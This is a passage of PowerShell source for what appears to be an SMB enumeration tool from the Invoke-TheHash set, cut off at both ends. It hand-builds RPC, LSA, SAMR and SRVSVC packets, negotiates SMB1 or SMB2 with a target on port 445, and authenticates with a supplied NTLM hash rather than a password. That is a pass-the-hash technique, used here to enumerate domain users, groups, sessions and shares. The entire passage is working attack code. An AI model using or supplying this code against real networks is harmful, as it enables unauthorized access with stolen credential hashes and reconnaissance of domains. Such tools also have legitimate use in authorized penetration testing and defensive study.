        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($call_ID -eq 3)
    {
        $RPCBind.Add("AuthType",[Byte[]](0x0a))
        $RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)
    {
        $full_auth_length = $AuthLength + $AuthPadding + 8
    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
    [Byte[]]$frag_length = $write_length[0,1]
    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCRequest.Add("Version",[Byte[]](0x05))
    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $RPCRequest.Add("PacketType",[Byte[]](0x00))
    $RPCRequest.Add("PacketFlags",$Flags)
    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCRequest.Add("FragLength",$frag_length)
    $RPCRequest.Add("AuthLength",$auth_length)
    $RPCRequest.Add("CallID",$CallID)
    $RPCRequest.Add("AllocHint",$alloc_hint)
    $RPCRequest.Add("ContextID",$ContextID)
    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)
    {
        $RPCRequest.Add("Data",$Data)
    }

    return $RPCRequest
}

# LSA
function New-PacketLSAOpenPolicy
{
    $LSAOpenPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAOpenPolicy.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_System",[Byte[]](0x5c,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_Unknown",[Byte[]](0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Len",[Byte[]](0x18,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Attributes",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_Qos_Len",[Byte[]](0x0c,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ImpersonationLevel",[Byte[]](0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ContextMode",[Byte[]](0x01))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_EffectiveOnly",[Byte[]](0x00))
    $LSAOpenPolicy.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $LSAOpenPolicy
}

function New-PacketLSAQueryInfoPolicy
{
    param([Byte[]]$Handle)

    $LSAQueryInfoPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAQueryInfoPolicy.Add("PointerToHandle",$Handle)
    $LSAQueryInfoPolicy.Add("Level",[Byte[]](0x05,0x00))

    return $LSAQueryInfoPolicy
}

function New-PacketLSAClose
{
    param([Byte[]]$Handle)

    $LSAClose = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAClose.Add("PointerToHandle",$Handle)

    return $LSAClose
}

function New-PacketLSALookupSids
{
    param([Byte[]]$Handle,[Byte[]]$SIDArray)

    $LSALookupSids = New-Object System.Collections.Specialized.OrderedDictionary
    $LSALookupSids.Add("PointerToHandle",$Handle)
    $LSALookupSids.Add("PointerToSIDs_SIDArray",$SIDArray)
    $LSALookupSids.Add("PointerToNames_count",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_NULL_pointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_level",[Byte[]](0x01,0x00))
    $LSALookupSids.Add("PointerToCount",[Byte[]](0x00,0x00))
    $LSALookupSids.Add("PointerToCount_count",[Byte[]](0x00,0x00,0x00,0x00))

    return $LSALookupSids
}

# SAMR

function New-PacketSAMRConnect2
{
    param([String]$SystemName)

    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect2 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect2.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect2.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect2.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect2.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $SAMRConnect2
}

function New-PacketSAMRConnect5
{
    param([String]$SystemName)

    $SystemName = "\\" + $SystemName
    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect5 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect5.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect5.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect5.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMRConnect5.Add("LevelIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_ClientVersion",[Byte[]](0x02,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

    return $SAMRConnect5
}

function New-PacketSAMRGetMembersInAlias
{
    param([Byte[]]$Handle)

    $SAMRGetMembersInAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRGetMembersInAlias.Add("PointerToConnectHandle",$Handle)

    return $SAMRGetMembersInAlias
}

function New-PacketSAMRClose
{
    param([Byte[]]$Handle)

    $SAMRClose = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRClose.Add("PointerToConnectHandle",$Handle)

    return $SAMRClose
}

function New-PacketSAMROpenAlias
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenAlias.Add("PointerToConnectHandle",$Handle)
    $SAMROpenAlias.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenAlias.Add("RID",$RID)

    return $SAMROpenAlias
}

function New-PacketSAMROpenGroup
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenGroup = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenGroup.Add("PointerToConnectHandle",$Handle)
    $SAMROpenGroup.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenGroup.Add("RID",$RID)

    return $SAMROpenGroup
}

function New-PacketSAMRQueryGroupMember
{
    param([Byte[]]$Handle)

    $SAMRQueryGroupMember = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRQueryGroupMember.Add("PointerToGroupHandle",$Handle)

    return $SAMRQueryGroupMember
}

function New-PacketSAMROpenDomain
{
    param([Byte[]]$Handle,[Byte[]]$SIDCount,[Byte[]]$SID)

    $SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenDomain.Add("PointerToConnectHandle",$Handle)
    $SAMROpenDomain.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenDomain.Add("PointerToSid_Count",$SIDCount)
    $SAMROpenDomain.Add("PointerToSid_Sid",$SID)

    return $SAMROpenDomain
}

function New-PacketSAMREnumDomainUsers
{
    param([Byte[]]$Handle)

    $SAMREnumDomainUsers = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMREnumDomainUsers.Add("PointerToDomainHandle",$Handle)
    $SAMREnumDomainUsers.Add("PointerToResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("AcctFlags",[Byte[]](0x10,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("MaxSize",[Byte[]](0xff,0xff,0x00,0x00))

    return $SAMREnumDomainUsers
}

function New-PacketSAMRLookupNames
{
    param([Byte[]]$Handle,[String]$Names)

    [Byte[]]$names_bytes = [System.Text.Encoding]::Unicode.GetBytes($Names)
    [Byte[]]$name_len = ([System.BitConverter]::GetBytes($names_bytes.Length))[0,1]
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($Names.Length)

    $SAMRLookupNames = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupNames.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupNames.Add("NumNames",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_MaxCount",[Byte[]](0xe8,0x03,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_NameLen",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_NameSize",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_MaxCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ActualCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Names",$names_bytes)

    return $SAMRLookupNames
}

function New-PacketSAMRLookupRids
{
    param([Byte[]]$Handle,[Byte[]]$RIDCount,[Byte[]]$Rids)

    $SAMRLookupRIDS = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupRIDS.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupRIDS.Add("NumRids",$RIDCount)
    $SAMRLookupRIDS.Add("Unknown",[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    $SAMRLookupRIDS.Add("NumRids2",$RIDCount)
    $SAMRLookupRIDS.Add("Rids",$Rids)

    return $SAMRLookupRIDS
}

# SRVSVC
function New-PacketSRVSVCNetSessEnum
{
    param([String]$ServerUNC)

    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)
       
    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetSessEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetSessEnum.Add("PointerToClient_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Client",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_User",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel_Level",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_Ctr",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_ReferentID",[Byte[]](0x0c,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ReferentID",[Byte[]](0x10,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetSessEnum
}

function New-PacketSRVSVCNetShareEnumAll
{
    param([String]$ServerUNC)

    $ServerUNC = "\\" + $ServerUNC
    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)

    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetShareEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetShareEnum.Add("PointerToLevel_Level",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Ctr",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_Ctr1_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetShareEnum.Add("ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetShareEnum
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 5000
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()
        
        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {
                
                switch ($stage)
                {

                    'NegotiateSMB'
                    {          
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {   

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }
                        
                    'NTLMSSPNegotiate'
                    { 
                        
                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
                $stage = 'Exit'
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
